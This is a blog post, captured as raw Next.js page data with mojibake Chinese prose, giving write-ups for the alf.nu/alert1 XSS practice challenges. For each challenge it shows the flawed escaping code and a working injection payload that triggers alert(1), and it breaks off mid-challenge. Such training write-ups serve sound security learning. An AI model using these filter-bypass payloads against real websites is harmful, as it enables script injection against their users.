1:HL["/_next/static/media/2aaf0723e720e8b9-s.p.woff2",{"as":"font","type":"font/woff2"}]
2:HL["/_next/static/css/40db9a3d7b10e1fc.css",{"as":"style"}]
3:HL["/_next/static/css/6c438bdd1a6b11fe.css",{"as":"style"}]
0:[[["",{"children":["posts",{"children":[["slug","xss-practices","c"],{"children":["__PAGE__?{\"slug\":[\"xss-practices\"]}",{}]}]}]},"$undefined","$undefined",true],"$L4",[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/40db9a3d7b10e1fc.css","precedence":"next"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/6c438bdd1a6b11fe.css","precedence":"next"}]],["$L5",["$","meta",null,{"name":"next-size-adjust"}]]]]]
6:I{"id":"350","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"ThemeProvider","async":false}
7:I{"id":"414","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"","async":false}
8:I{"id":"9544","chunks":["272:static/chunks/webpack-3256771b4b5faaf4.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
9:I{"id":"99","chunks":["272:static/chunks/webpack-3256771b4b5faaf4.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
b:I{"id":"1234","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"Analytics","async":false}
4:[["$","html",null,{"lang":"en","children":["$","body",null,{"className":"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4","children":["$","$L6",null,{"attribute":"class","defaultTheme":"system","enableSystem":true,"children":[["$","div",null,{"className":"my-max mx-auto py-10 px-4","children":[["$","header",null,{"children":["$","div",null,{"className":"my-flex","children":[["$","div",null,{"className":"flex space-x-6 ","children":["$","p",null,{"className":"blog-name font-medium text-2xl","children":"Always Exploring"}]}],["$","nav",null,{"className":"nav-ml text-sm font-medium space-x-6","children":[["$","$L7",null,{"href":"/","children":"Home"}],["$","$L7",null,{"href":"/about","children":"About"}]]}]]}]}],["$","main",null,{"children":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["slug","xss-practices","c"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$La",null],"segment":"__PAGE__?{\"slug\":[\"xss-practices\"]}"},"styles":[]}],"segment":["slug","xss-practices","c"]},"styles":[]}],"segment":"posts"},"styles":[]}]}]]}],["$","$Lb",null,{}]]}]}]}],null]
5:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"XSSç»ƒä¹ :alf.nu/alert1 Write-ups"}],null,null,null,null,null,null,null,null,null,["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"any"}]],[],null]]
c:I{"id":"1753","chunks":["46:static/chunks/46-79f3cb62e0a9762a.js","49:static/chunks/app/posts/[...slug]/page-403c6a1364df7930.js"],"name":"","async":false}
a:[["$","$Lc",null,{}],["$","article",null,{"className":"py-6 prose post-prose dark:prose-invert","children":[["$","div",null,{"className":"post-title","children":"XSSç»ƒä¹ :alf.nu/alert1 Write-ups"}],["$","time",null,{"dateTime":"2018-01-29T17:26:26.000Z","className":"post-time","children":"January 29, 2018"}],"$undefined",["$","div",null,{"className":"js-toc-content","children":[["$","h1",null,{"id":"å‰è¨€","children":"å‰è¨€"}],"\n",["$","p",null,{"children":["è¿™äº›å¤©åœ¨",["$","a",null,{"href":"https://alf.nu/alert1","children":"alf.nu/alert1"}],"ä¸Šåšäº†XSSç»ƒä¹ é¢˜ï¼Œç›®å‰å¤§éƒ¨åˆ†åšå‡ºæ¥äº†ï¼Œä½†æœ‰äº›é¢˜ç›®å¹¶ä¸æ˜¯æœ€ä¼˜è§£ã€‚è¿˜å‰©ä¸‹2é“é¢˜æ²¡æœ‰åšå‡ºï¼ˆFruit3, Qunieï¼‰ï¼Œåœ¨æ­¤åšä¸ªè®°å½•ã€‚æ¬¢è¿å¤§å®¶äº¤æµã€‚"]}],"\n",["$","h1",null,{"id":"warmup","children":"Warmup"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-javascript","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}],"+s+",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é¢˜å¯¹è¾“å…¥æ²¡æœ‰é™åˆ¶ï¼Œåªè¦é—­åˆæ‰console.logå³å¯ã€‚\nsolution(12 chars): ",["$","code",null,{"children":"\");alert(1,\""}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"adobe","children":"Adobe"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\"/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\\"'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é¢˜escapeå°†è¾“å…¥çš„å¼•å·",["$","code",null,{"children":"\""}],"è½¬æ¢ä¸ºäº†",["$","code",null,{"children":"\\\\\""}],"ï¼Œä½¿å¾—å¼•å·å˜æˆäº†å­—é¢é‡ï¼Œä¸Šä¸€é¢˜çš„æ–¹æ³•æ— æ•ˆäº†ã€‚ä¸è¿‡å¦‚æœè¾“å…¥ä¸º",["$","code",null,{"children":"\\\""}],"ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æ¢ä¸º",["$","code",null,{"children":"\\\\\\\""}],"ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæœ¬æ¥æ˜¯è½¬ä¹‰å¼•å·çš„ï¼Œä½†å˜æˆäº†è½¬ä¹‰åæ–œæ†äº†ï¼Œä»è€Œå¼•å·å¯ä»¥é€ƒè„±è½¬ä¹‰äº†ã€‚\nsolution(14 chars): ",["$","code",null,{"children":"\\\");alert(1)//"}]]}],"\n",["$","h1",null,{"id":"json","children":"JSON"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  s = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log('"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"');</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é¢˜å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²ç”¨äº†",["$","code",null,{"children":"JSON.stringify()"}],"(",["$","a",null,{"href":"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify","children":"ç›¸å…³ä»‹ç»"}],")æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è¿‡æ»¤äº†",["$","code",null,{"children":"\\"}],",",["$","code",null,{"children":"\""}],"ç­‰å­—ç¬¦ï¼Œåˆ†åˆ«è½¬åŒ–ä¸º",["$","code",null,{"children":"\\\\"}],",",["$","code",null,{"children":"\\\""}],"ç­‰ï¼Œä½†æ²¡æœ‰è¿‡æ»¤",["$","code",null,{"children":"<"}],",",["$","code",null,{"children":">"}],",",["$","code",null,{"children":"/"}],"å­—ç¬¦ï¼Œè¿™å°±å¤Ÿç”¨äº†ã€‚æ—¢ç„¶é—­åˆä¸äº†",["$","code",null,{"children":"log"}],"å‡½æ•°ï¼Œé‚£å°±é—­åˆ",["$","code",null,{"children":"script"}],"æ ‡ç­¾å§\nsolution(27 chars): ",["$","code",null,{"children":"</script><script>alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"javascript","children":"JavaScript"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," url = ",["$","span",null,{"className":"hljs-string","children":"'javascript:console.log('"}]," + ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s) + ",["$","span",null,{"className":"hljs-string","children":"')'"}],";\n  ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(url);\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," a = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'a'"}],");\n  a.",["$","span",null,{"className":"hljs-property","children":"href"}]," = url;\n  ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"body"}],".",["$","span",null,{"className":"hljs-title function_","children":"appendChild"}],"(a);\n  a.",["$","span",null,{"className":"hljs-title function_","children":"click"}],"();\n}\n"]}]}],"\n",["$","p",null,{"children":["åŒæ ·å› ä¸º",["$","code",null,{"children":"JSON.stringify()"}],"çš„åŸå› æ²¡åŠæ³•ç”¨ç›´æ¥ç”¨",["$","code",null,{"children":"\""}],"ï¼Œä½†æ˜¯ç”±äºè¿™æ¬¡æ³¨å…¥çš„åœ°æ–¹æ˜¯urlï¼Œæ‰€ä»¥å¯ä»¥ç”¨URLç¼–ç çš„åŠæ³•è®²",["$","code",null,{"children":"\""}],"è½¬æ¢ä¸º",["$","code",null,{"children":"%22"}],"ã€‚\nsolution(15 chars): ",["$","code",null,{"children":"%22);alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"markdown","children":"Markdown"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," text = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/</g"}],", ",["$","span",null,{"className":"hljs-string","children":"'&lt;'"}],").",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\"/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'&quot;'"}],");\n  ",["$","span",null,{"className":"hljs-comment","children":"// URLs"}],"\n  text = text.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/(http:\\/\\/\\S+)/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'<a href=\"$1\">$1</a>'"}],");\n  ",["$","span",null,{"className":"hljs-comment","children":"// [[img123|Description]]"}],"\n  text = text.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\\[\\[(\\w+)\\|(.+?)\\]\\]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'<img alt=\"$2\" src=\"$1.gif\">'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," text;\n}\n"]}]}],"\n",["$","p",null,{"children":"é¦–å…ˆåˆ†æè¿™é¢˜çš„å¤„ç†æ–¹æ³•"}],"\n",["$","ol",null,{"children":["\n",["$","li",null,{"children":["é¦–å…ˆï¼Œå¯¹äºä»»ä½•è¾“å…¥ï¼Œå…ˆè¿‡æ»¤æ‰",["$","code",null,{"children":"<"}],"å’Œ",["$","code",null,{"children":"\""}],"å˜ä¸ºå®ä½“ç¼–ç ",["$","code",null,{"children":"&lt"}],"å’Œ",["$","code",null,{"children":"&quot"}],"ã€‚"]}],"\n",["$","li",null,{"children":["å¦‚æœå­—ç¬¦ä¸²ä¸­æœ‰åŒ…å«",["$","code",null,{"children":"http://"}],"å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚",["$","code",null,{"children":"http://xiao.world"}],"åˆ™å˜ä¸º",["$","code",null,{"children":"<a href=\"http://xiao.world\">http://xiao.world</a>"}]]}],"\n",["$","li",null,{"children":["å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«",["$","code",null,{"children":"[[img_src|img_alt]]"}],"æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œåˆ™å˜ä¸º",["$","code",null,{"children":"<img alt=\"img_alt\" src=\"this_src.git\">"}]]}],"\n",["$","li",null,{"children":"è¿”å›å­—ç¬¦ä¸²"}],"\n"]}],"\n",["$","p",null,{"children":["å¯¹äºè¿™ä¸ªé¢˜ç›®ï¼Œå› ä¸ºå°–æ‹¬å·å’Œå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ä»è¿™é‡Œå…¥æ‰‹ä¼šæ¯”è¾ƒå›°éš¾ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨ç¬¬äºŒç‚¹å’Œç¬¬ä¸‰ç‚¹çš„è§„åˆ™æ¥åšçªç ´å£ã€‚ä¸ºç”šä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿæ—¢ç„¶è‡ªå·±æ²¡åŠæ³•é—­åˆå±æ€§çš„å¼•å·æˆ–è€…æ ‡ç­¾ï¼Œä½†æ˜¯è§„åˆ™äºŒè½¬æ¢ä¹‹åä¼šå¸¦æœ‰å¼•å·ï¼Œåˆ©ç”¨è¿™ä¸ªå¼•å·ï¼Œå°±å¯ä»¥é—­åˆæ‰è§„åˆ™ä¸‰è½¬æ¢ä¹‹åçš„imgæ ‡ç­¾çš„altå±æ€§äº†ã€‚\nè¾“å…¥ï¼š",["$","code",null,{"children":"[[a|http://onerror='alert(1)]]"}],"\nç»è¿‡è§„åˆ™ä¸€è½¬æ¢å:",["$","code",null,{"children":"[[a|<a href=\"http://onerror='alert(1)']]\">http://onerror='alert(1)']]</a>"}],"\nå†ç»è¿‡è§„åˆ™äºŒè½¬æ¢ï¼š ",["$","code",null,{"children":"<img alt=\"<a href=\"http://onerror='alert(1)'\" src=\"a.gif\">\">http://onerror='alert(1)']]</a>"}],"\næ„Ÿè°¢HTMLè¯­è¨€æ¾æ•£çš„ç‰¹æ€§ï¼Œä»¥ä¸Šå³ç›¸å½“äº: ",["$","code",null,{"children":"<img alt=\"<a href=\" http:=\"\" onerror=\"alert(1)\" \"=\"\" src=\"a.gif\">"}],"\nå†ç²¾ç®€ä¸€ç‚¹ï¼Œåªçœ‹å…³é”®éƒ¨åˆ†: ",["$","code",null,{"children":"<img alt=\"<a href=\" onerror=\"alert(1)\" src=\"a.git\">"}],"\nè‡³æ­¤ï¼Œå¤§åŠŸå‘ŠæˆğŸ˜„ã€‚\nsolution(31 chars): ",["$","code",null,{"children":"[[a|http://onerror='alert(1)']]"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"dom","children":"DOM"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-comment","children":"// Slightly too lazy to make two input fields."}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"// Pass in something like \"TextNode#foo\""}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," m = s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/#/"}],");\n\n  ",["$","span",null,{"className":"hljs-comment","children":"// Only slightly contrived at this point."}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," a = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  a.",["$","span",null,{"className":"hljs-title function_","children":"appendChild"}],"(",["$","span",null,{"className":"hljs-variable language_","children":"document"}],"[",["$","span",null,{"className":"hljs-string","children":"'create'"}],"+m[",["$","span",null,{"className":"hljs-number","children":"0"}],"]].",["$","span",null,{"className":"hljs-title function_","children":"apply"}],"(",["$","span",null,{"className":"hljs-variable language_","children":"document"}],", m.",["$","span",null,{"className":"hljs-title function_","children":"slice"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")));\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," a.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["å…³é”®åœ¨äºç†è§£ç¬¬å…«è¡Œçš„ä»£ç ã€‚\nå¦‚æœè¾“å…¥ä¸º",["$","code",null,{"children":"Element#alert"}],"\nç¬¬å…«è¡Œä¸ºï¼š",["$","code",null,{"children":"document[\"createElement\"].apply(document, \"alert\")"}],"\nç›¸å½“äº",["$","code",null,{"children":"document.createElement(\"alert\")"}],"\nè¿™æ ·åªæ˜¯åˆ›å»ºäº†ä¸€ä¸ª",["$","code",null,{"children":"<alert>"}],"æ ‡ç­¾ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•æ³¨å…¥ã€‚æ‰€ä»¥æŸ¥ä¸€ä¸‹documentæœ‰å“ªäº›createå¼€å¤´çš„æ–¹æ³•ï¼Œä¸€ä¸‹åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„ï¼š"]}],"\n",["$","blockquote",null,{"children":["\n",["$","p",null,{"children":"createElement\ncreateTextNode\ncreateComment\ncreateAttribute\ncreateEvent"}],"\n"]}],"\n",["$","p",null,{"children":["è¿™é‡Œçœ‹åˆ°æœ‰",["$","code",null,{"children":"createComment"}],"å°±ä»¤äººç‰¹åˆ«å¼€å¿ƒã€‚æ‰€ä»¥ç­”æ¡ˆè§ä¸‹\nsolution(32 chars): ",["$","code",null,{"children":"Comment#><iframe onload=alert(1)"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"callback","children":"Callback"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-comment","children":"// Pass inn \"callback#userdata\""}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," thing = s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/#/"}],");\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (!",["$","span",null,{"className":"hljs-regexp","children":"/^[a-zA-Z\\[\\]']*$/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"])) ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'Invalid callback'"}],";\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," obj = {",["$","span",null,{"className":"hljs-string","children":"'userdata'"}],": thing[",["$","span",null,{"className":"hljs-number","children":"1"}],"] };\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," json = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(obj).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/</g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\u003c'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"\"<script>\""}]," + thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"] + ",["$","span",null,{"className":"hljs-string","children":"\"(\""}]," + json +",["$","span",null,{"className":"hljs-string","children":"\")</script>\""}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["éšä¾¿è¾“å…¥ç‚¹çœ‹çœ‹æ•ˆæœå§ï¼š",["$","code",null,{"children":"input1#input2"}],"\nè¾“å‡º: ",["$","code",null,{"children":"<script>input1({\"userdata\":\"input2\"})</script>"}],"\nå› ä¸ºinput1æœ‰è¾“å…¥è¦æ±‚ï¼Œä½†æ˜¯input2å¯ä»¥ä¸ºä»»æ„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ³¨å…¥å¯ä»¥æ”¾åœ¨input2ï¼Œä½†æ˜¯åœ¨input2ä¹‹å‰æœ‰ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œæœ€ç›´æ¥ç®€å•çš„åŠæ³•å°±æ˜¯ç”¨å¼•å·é—­åˆæ‰ä»–ä»¬å°±å¥½äº†ã€‚æ‰€å¹¸input1å¹¶æ²¡æœ‰æŠŠå•å¼•å·è¿‡æ»¤æ‰ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±æ˜¯\nsolution(15 chars): ",["$","code",null,{"children":"'#';alert(1);//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"skandia","children":"Skandia"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s.",["$","span",null,{"className":"hljs-title function_","children":"toUpperCase"}],"() + ",["$","span",null,{"className":"hljs-string","children":"'\")</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["é¢˜ç›®çœŸçŸ­ï¼Œä½†å¿ƒæ€æ²¡å°‘èŠ±å‘€ã€‚\njsçš„æ–¹æ³•åæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œå¦‚æœæŠŠ",["$","code",null,{"children":"alert"}],"å˜ä¸ºäº†",["$","code",null,{"children":"ALERT"}],"ï¼Œé‚£å°±ä¸è¡Œäº†ã€‚ä½†æ˜¯HTMLæ ‡ç­¾åå’Œå±æ€§åæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é—­åˆæ‰",["$","code",null,{"children":"<script>"}],"æ ‡ç­¾ï¼Œç„¶åè‡ªå·±æ³¨å…¥æ ‡ç­¾ï¼Œåˆ©ç”¨",["$","code",null,{"children":"onload"}],"å±æ€§å‡ºå‘",["$","code",null,{"children":"alert"}],"ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯",["$","code",null,{"children":"alert"}],"å¤§å°å†™æ€ä¹ˆåŠå‘¢ï¼Ÿä¾æˆ‘ä¸ªäººæµ‹è¯•å’Œç†è§£(æš‚æ—¶æœªæ‰¾åˆ°æ ¹æ®)ï¼Œåœ¨å±æ€§å€¼å¤„ä½¿ç”¨å®ä½“ç¼–ç çš„è¯ï¼Œæ˜¯å¯ä»¥è‡ªåŠ¨è§£ç çš„,å…¶ä»–åœ°æ–¹åˆ™ä¸è¡Œã€‚æ‰€ä»¥ï¼Œé—®é¢˜è§£å†³äº†ã€‚\nsolution(53 chars): ",["$","code",null,{"children":"</script><iframe onload=&#x61&#x6C&#x65&#x72&#x74(1)>"}],"\nä½†æˆ‘è¿™ä¸ªè§£ç”¨äº†53ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸æ˜¯æœ€çŸ­çš„ï¼Œä½†æ˜¯æœ‰äººä¹Ÿæœ‰äººåšåˆ°äº†30å¤šå’Œ40å¤šçš„ï¼Œæˆ‘æš‚æ—¶ä¹Ÿæƒ³ä¸åˆ°ä»€ä¹ˆåŠæ³•ã€‚æœ‰çŸ¥é“çš„è¯·å‘Šè¯‰æˆ‘ä¸€å£°ï¼Œè°¢è°¢ğŸ˜„"]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"template","children":"Template"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"htmlEscape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/./g"}],", ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"x"}],") {\n       ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," { ",["$","span",null,{"className":"hljs-string","children":"'<'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&lt;'"}],", ",["$","span",null,{"className":"hljs-string","children":"'>'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&gt;'"}],", ",["$","span",null,{"className":"hljs-string","children":"'&'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&amp;'"}],", ",["$","span",null,{"className":"hljs-string","children":"'\"'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&quot;'"}],", ",["$","span",null,{"className":"hljs-string","children":"\"'\""}],": ",["$","span",null,{"className":"hljs-string","children":"'&#39;'"}]," }[x] || x;\n     });\n  }\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"expandTemplate"}],"(",["$","span",null,{"className":"hljs-params","children":"template, args"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," template.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(\n        ",["$","span",null,{"className":"hljs-regexp","children":"/{(\\w+)}/g"}],",\n        ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"_, n"}],") {\n           ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-title function_","children":"htmlEscape"}],"(args[n]);\n         });\n  }\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-title function_","children":"expandTemplate"}],"(\n    ",["$","span",null,{"className":"hljs-string","children":"\"                                                \\n\\\n      <h2>Hello, <span id=name></span>!</h2>         \\n\\\n      <script>                                       \\n\\\n         var v = document.getElementById('name');    \\n\\\n         v.innerHTML = '<a href=#>{name}</a>';       \\n\\\n      <\\/script>                                     \\n\\\n    \""}],",\n    { name : s }\n  